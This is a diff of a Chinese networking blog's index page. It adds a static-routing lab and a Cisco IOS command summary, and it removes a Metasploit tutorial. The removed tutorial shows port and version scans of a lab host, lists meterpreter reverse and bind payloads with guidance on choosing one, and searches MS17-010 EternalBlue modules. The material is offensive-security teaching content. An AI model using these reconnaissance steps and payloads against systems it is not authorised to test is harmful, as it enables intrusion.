+<h1 id="四：实验"><a href="#四：实验" class="headerlink" title="四：实验"></a>四：实验</h1><h2 id="4-1-实验目录"><a href="#4-1-实验目录" class="headerlink" title="4.1 实验目录"></a>4.1 实验目录</h2><p>练习对静态路由配置的使用；</p>
+<h2 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h2><p>通过 PNETLab Box 新建3台路由器，分别为三台路由器配置 IP 地址，并将三台路由器接线依次连通。通过在路由器上配置静态路由，使得三个路由器之间信息可以达到互传的目的。</p>
+<h2 id="4-3-实验过程"><a href="#4-3-实验过程" class="headerlink" title="4.3 实验过程"></a>4.3 实验过程</h2><ol>
+<li><p>新建PNETLab Box实验室</p>
+</li>
+<li><p>新建3个路由器</p>
+</li>
+<li><p>配置基础设置</p>
+<ul>
+<li>工程三招</li>
+</ul>
+</li>
+<li><p>为路由器配置IP地址</p>
+<ul>
+<li>enable</li>
+<li>configure terminal</li>
+<li>interface 接口类型 插槽&#x2F;接口编号</li>
+<li>ip address ip地址 子网掩码</li>
+<li>no shutdown</li>
+<li>end</li>
+<li>show ip interface brief</li>
+</ul>
+</li>
+<li><p>配置静态路由</p>
+<img src="/2022/12/01/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/image-20221201115529110.png" style="zoom:50%;"></li>
+</ol>
+<ul>
+<li>为中间路由配置2个IP地址</li>
+<li>通过下一跳方式配置路由<ul>
+<li>实现192.168.1.110 与 192.168.2.111 通信</li>
+<li>ip route 192.168.2.0 255.255.255.0 192.168.1.111</li>
+<li>该指令明通过明确下一跳地址，源路由通过递归查询出接口（与192.168.1.111可实现互通的出接口），将数据发送到目标路由器上。</li>
+</ul>
+</li>
+<li>通过配置出接口方式<ul>
+<li>ip route 192.168.2.0 255.255.255.0 Gi0&#x2F;0</li>
+<li>该方法通过直接指定出接口，将数据包发送出去。</li>
+</ul>
+</li>
+<li>通过配置出接口+IP地址方式<ul>
+<li>ip route 192.168.2.0 255.255.255.0 Gi0&#x2F;0 192.168.1.111</li>
+<li>更加详细的指出对方接收数据的ip地址，安全可靠。</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-4-实验总结"><a href="#4-4-实验总结" class="headerlink" title="4.4 实验总结"></a>4.4 实验总结</h2><ol>
+<li>一个路由器，可以通过配置IP来标识自身，以及所处网段。</li>
+<li>两个路由器通过线路直接连接，即可互通。</li>
+<li>三台路由器通过搭桥的方式实现互通，两端路由器分别都要与桥的对端出接口互通，即可完成三者互通。</li>
+<li>路由通信的本质是：当发送一个数据包时，已知自身IP，通过路由表查询目标地址或下一跳地址，数据被推送出去；当数据被下一跳接受到时，该路由器检索自身的路由表，再次进行数据转发，直到目标地址接收到为止。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">Cisco IOS 基础命令集汇总</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-30 11:37:37" itemprop="dateCreated datePublished" datetime="2022-11-30T11:37:37+08:00">2022-11-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-01 09:46:11" itemprop="dateModified" datetime="2022-12-01T09:46:11+08:00">2022-12-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%9D%E7%A7%91CCNA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">思科CCNA网络基础入门</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：Cisco-IOS"><a href="#一：Cisco-IOS" class="headerlink" title="一：Cisco IOS"></a>一：Cisco IOS</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><ul>
+<li>Cisco internetwork operating system（IOS）：为 Cisco 设备配备的系统软件。应用于路由器、局域网交换机、小型无线接入点、具有几十个接口的大型路由器等。</li>
+</ul>
+<h2 id="1-2-功能"><a href="#1-2-功能" class="headerlink" title="1.2 功能"></a>1.2 功能</h2><ul>
+<li>Cisco IOS 可为设备提供以下网络服务<ul>
+<li>基本的路由和交换功能</li>
+<li>安全可靠地访问网络资源</li>
+<li>网络可伸缩性</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-3-访问方式"><a href="#1-3-访问方式" class="headerlink" title="1.3 访问方式"></a>1.3 访问方式</h2><ul>
+<li>可以通过多种方法访问 CLI 环境，常见方式：<ul>
+<li>控制台</li>
+<li>Telnet 或者 SSH</li>
+<li>辅助端口</li>
+</ul>
+</li>
+</ul>
+<img src="/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/image-20221130114858440.png" style="zoom: 50%;">
+
+<h2 id="1-4-访问模式"><a href="#1-4-访问模式" class="headerlink" title="1.4 访问模式"></a>1.4 访问模式</h2><ul>
+<li>用户执行模式 “&gt;”</li>
+<li>特权执行模式 “#”</li>
+<li>全局配置模式<ul>
+<li>从全局配置模式可进入多种不同的配置模式。其中每种模式可用于配置 IOS 设备的特定部分或者特定功能。</li>
+</ul>
+</li>
+<li>其他特定模式<ul>
+<li>接口模式：用于配置一个网络接口（Fa0&#x2F;0、S0&#x2F;0&#x2F;0 等）</li>
+<li>线路模式：用于配置一条线路（实际线路或者虚拟线路），如控制台、AUX、VTY等</li>
+<li>路由配置模式：用于配置一个路由选择协议进程的相关参数</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-5-模式切换"><a href="#1-5-模式切换" class="headerlink" title="1.5 模式切换"></a>1.5 模式切换</h2><ul>
+<li>enable：用户执行模式进入特权模式</li>
+<li>configure terminal：特权模式进入全局配置模式</li>
+<li>exit：返回上一级模式</li>
+<li>end：直接返回特权模式</li>
+</ul>
+<h2 id="1-6-基础操作"><a href="#1-6-基础操作" class="headerlink" title="1.6 基础操作"></a>1.6 基础操作</h2><ul>
+<li>?：使用 ? 可以匹配查看命令库</li>
+<li>设置IP：ip address IP地址 子网掩码</li>
+<li>no：使用 no shutdown，退出保持状态开启。</li>
+<li>show running-config：查看配置信息</li>
+<li>show ip interface brief：查看 ip 简短信息</li>
+<li>hostname 名称：设置主机名称（全局模式下）</li>
+<li>enable password 密码：设置主机密码</li>
+<li>no enable password：关闭密码验证</li>
+<li>enable secret 密码：采用加密方式设置密码</li>
+</ul>
+<h2 id="1-7-语法检查"><a href="#1-7-语法检查" class="headerlink" title="1.7 语法检查"></a>1.7 语法检查</h2><ul>
+<li>incomplete command：命令不完整</li>
+<li>invalid input detected at ‘^’ marker：箭头所指字符无法识别 </li>
+<li>ambiguous comm：未知输入</li>
+</ul>
+<h2 id="1-8-基本命令结构"><a href="#1-8-基本命令结构" class="headerlink" title="1.8 基本命令结构"></a>1.8 基本命令结构</h2><ul>
+<li>每个 IOS 命令都具有特定的格式或者语法，并在相应的提示符下执行</li>
+<li>常规命令语法为命令后接相应的关键字和参数<ul>
+<li>Router&gt; ping 192.168.1.2</li>
+</ul>
+</li>
+<li>某些命令包括一个关键字和参数子集，此子集可提供额外功能</li>
+</ul>
+<h2 id="1-9-快捷键"><a href="#1-9-快捷键" class="headerlink" title="1.9 快捷键"></a>1.9 快捷键</h2><ul>
+<li>Tab：填写命令或者关键字的剩下部分</li>
+<li>Ctrl+R：重新显示一行</li>
+<li>Ctrl+Z：退出配置模式并返回执行模式</li>
+<li>Ctrl+C：放弃当前命令并退出配置模式</li>
+<li>Ctrl+Shift+6：用于中断诸如 ping 或 traceroute 之类的 IOS 进程</li>
+<li>向上箭头：上一条键入命令</li>
+<li>向下箭头：下一条键入命令</li>
+</ul>
+<h2 id="1-10-常用配置"><a href="#1-10-常用配置" class="headerlink" title="1.10 常用配置"></a>1.10 常用配置</h2><ul>
+<li>配置用户登录密码<ul>
+<li>控制台口令：用于限制人员通过控制台连接访问设备</li>
+<li>使能口令：用于限制人员访问特权执行模式</li>
+<li>使能加密口令：经加密，，用于限制人员访问特权执行模式</li>
+<li>VTY口令：用于限制人员通过 Telnet 访问设备</li>
+</ul>
+</li>
+<li>管理配置文件<ul>
+<li>将当前配置写入启动配置文件<ul>
+<li>write</li>
+<li>copy running-config startup-config</li>
+</ul>
+</li>
+<li>删除启动配置 文件<ul>
+<li>erase startup-config</li>
+<li>delete flash:config.text</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>接口配置<ul>
+<li>进入接口<ul>
+<li>interface 接口类型 插槽&#x2F;接口编号</li>
+</ul>
+</li>
+<li>为接口配置IP地址<ul>
+<li>ip address ip地址 子网掩码</li>
+</ul>
+</li>
+<li>激活接口<ul>
+<li>no shutdown（默认是shutdown状态）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>show 命令<ul>
+<li>show version：查看当前操作系统版本</li>
+<li>show running-config：查看运行配置</li>
+<li>show startup-config：查看启动配置</li>
+<li>show flash：查看FLASH</li>
+<li>show cpu：查看cpu利用率</li>
+<li>show memory：查看内存使用情况</li>
+<li>show interface：查看端口</li>
+</ul>
+</li>
+<li>验证配置<ul>
+<li>ping</li>
+<li>traceroute</li>
+</ul>
+</li>
+</ul>
+<h1 id="二：以太网技术线缆标准"><a href="#二：以太网技术线缆标准" class="headerlink" title="二：以太网技术线缆标准"></a>二：以太网技术线缆标准</h1><ul>
+<li>T-568A：绿白-绿-橙白-蓝-蓝白-橙-棕白-棕</li>
+<li>T-568B：橙白-橙-绿白-蓝-蓝白-绿-棕白-棕</li>
+<li>标准网线：不同设备用于直通线，即两头都是568A或者都是568B</li>
+<li>交叉网线：同等设备用交叉线即一头为568A，一头为568B</li>
+<li>全反线（一般用于配置线缆）两端线序刚好相反</li>
+</ul>
+<h1 id="三：工程三招"><a href="#三：工程三招" class="headerlink" title="三：工程三招"></a>三：工程三招</h1><ul>
+<li>no ip domain lookup：关闭域名解析（防止敲错命令查询）</li>
+<li>line console 0<ul>
+<li>logging synchronous：log当前显示信息同步</li>
+<li>no exec-timeout：关闭会话超时，防止一段时间不操作自动退出</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/30/IP%E5%9C%B0%E5%9D%80%E5%8F%8A%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81%E5%88%92%E5%88%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -975,546 +1677,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Metasploit framework 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-27 13:23:47" itemprop="dateCreated datePublished" datetime="2022-11-27T13:23:47+08:00">2022-11-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-28 01:39:25" itemprop="dateModified" datetime="2022-11-28T01:39:25+08:00">2022-11-28</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>Metasploit framework （MSF）是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用于信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。</p>
-<h1 id="二：模块功能"><a href="#二：模块功能" class="headerlink" title="二：模块功能"></a>二：模块功能</h1><h2 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h2><p>漏洞利用工具集中打开；</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用命令行打开</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">       =[ metasploit v6.2.9-dev                           ]</span><br><span class="line">+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: When in a module, use back to go </span><br><span class="line">back to the top level prompt</span><br></pre></td></tr></table></figure>
-
-<p>这里一共提供了7个种类的模块，功能如下：</p>
-<ul>
-<li>exploits：漏洞渗透模块，我们在发现漏洞之后，就可以使用这类模块实现快速渗透。根据漏洞或者系统名称，可以搜索出对应的漏洞模块，然后使用模块，设置几个简单的参数，然后再执行运用这个模块，完成入侵。</li>
-<li>auxiliary：辅助模块，用于信息收集，使用此类模块就可以完成信息收集的任务。</li>
-<li>post：后渗透攻击模块，当我们拿到目标系统的控制权限之后，为了绕开系统的保护机制，我们可以使用此类模块。它可以帮助我们提高控制权限，进而获取敏感信息和实施跳板攻击。</li>
-<li>payload：攻击载荷模块，通过它我们可以实现对目标的远程控制。</li>
-</ul>
-<h2 id="2-2-信息收集"><a href="#2-2-信息收集" class="headerlink" title="2.2 信息收集"></a>2.2 信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 msf 的扫描模块，可以查看大量的扫描模块</span> </span><br><span class="line">msf6 &gt; search scanner</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">   Name                                                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -    ----                                                                     ---------------  ----    -----  -----------</span><br><span class="line">   0    auxiliary/scanner/http/a10networks_ax_directory_traversal                2014-01-28       normal  No     A10 Networks AX Loadbalancer Directory Traversal</span><br><span class="line">   1    auxiliary/scanner/snmp/aix_version                                                        normal  No     AIX SNMP Scanner Auxiliary Module</span><br><span class="line">   2    auxiliary/scanner/discovery/arp_sweep                                                     normal  No     ARP Sweep Local Network Discovery</span><br><span class="line">...</span><br><span class="line">   614  auxiliary/scanner/rservices/rexec_login                                                   normal  No     rexec Authentication Scanner</span><br><span class="line">   615  auxiliary/scanner/rservices/rlogin_login                                                  normal  No     rlogin Authentication Scanner</span><br><span class="line">   616  auxiliary/scanner/rservices/rsh_login                                                     normal  No     rsh Authentication Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 616, use 616 or use auxiliary/scanner/rservices/rsh_login</span><br><span class="line">通过名称或者索引与模块交互。例如: info 616, use 616 或者 use auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure>
-
-<h3 id="（1）以-syn-扫描模块为例"><a href="#（1）以-syn-扫描模块为例" class="headerlink" title="（1）以 syn 扫描模块为例"></a>（1）以 syn 扫描模块为例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 syn 模块</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/portscan/syn 	</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机 IP</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set THREADS 40</span><br><span class="line">THREADS =&gt; 40</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看设置参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS     192.168.80.1     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    40               yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动信息收集</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; run</span><br><span class="line"> </span><br><span class="line">[+]  TCP OPEN 192.168.80.1:135</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:139</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:443</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:445</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:1433</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:3306</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）使用-nmap-扫描"><a href="#（2）使用-nmap-扫描" class="headerlink" title="（2）使用 nmap 扫描"></a>（2）使用 nmap 扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-vV：进行版本探测</span></span><br><span class="line">msf6 &gt; nmap -sV 192.168.80.1</span><br><span class="line">[*] exec: nmap -sV 192.168.80.1</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 15:10 CST</span><br><span class="line">Nmap scan report for localhost (192.168.80.1)</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 994 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http      Apache httpd</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2095</span><br><span class="line">3306/tcp open  mysql         MySQL 5.7.31-log</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">已执行服务检测。请向 https://nmap.org/submit/ 报告任何不正常的结果。</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds</span><br><span class="line">Nmap完成：在 17.86 秒内扫描了1个 IP 地址。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-尝试攻击"><a href="#2-3-尝试攻击" class="headerlink" title="2.3 尝试攻击"></a>2.3 尝试攻击</h2><h2 id="Metasploit-中常见-payload"><a href="#Metasploit-中常见-payload" class="headerlink" title="Metasploit 中常见 payload"></a>Metasploit 中常见 payload</h2><h3 id="（1）连接方式"><a href="#（1）连接方式" class="headerlink" title="（1）连接方式"></a>（1）连接方式</h3><ul>
-<li>windows&#x2F;meterpreter&#x2F;bind_tcp					# 正向连接</li>
-<li>windows&#x2F;meterpreter&#x2F;reverse_tcp              # 反向连接，常用</li>
-<li>windows&#x2F;meterperter&#x2F;reverse_http             # 通过监听80端口的反向连接</li>
-<li>windows&#x2F;meterperter&#x2F;reverse_https           # 通过监听443端口的反向连接</li>
-</ul>
-<h3 id="（2）使用场景"><a href="#（2）使用场景" class="headerlink" title="（2）使用场景"></a>（2）使用场景</h3><ul>
-<li>正向连接：我们攻击主机在内网，而目标主机在外网。目标主机无法和我们建立主动连接，而且大多数真是环境下目标主机防火墙只会允许我们访问少量的端口。如80端口，而80端口的访问量很多，所以也就可能导致连接失败的可能。</li>
-<li>反向连接：我们的攻击机和目标主机同时在外网或者内网，这样目标主机可以和我们建立主动连接，而且即使有防火墙也没关系，反向连接是用的比较多的一种。</li>
-<li>反向连接80和反向连接443端口：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或者443端口与外部通信。</li>
-</ul>
-<h3 id="（3）查看漏洞模块"><a href="#（3）查看漏洞模块" class="headerlink" title="（3）查看漏洞模块"></a>（3）查看漏洞模块</h3><p>exploit：攻击模块</p>
-<p>auxiliary：辅助模块</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看漏洞模块</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure>
-
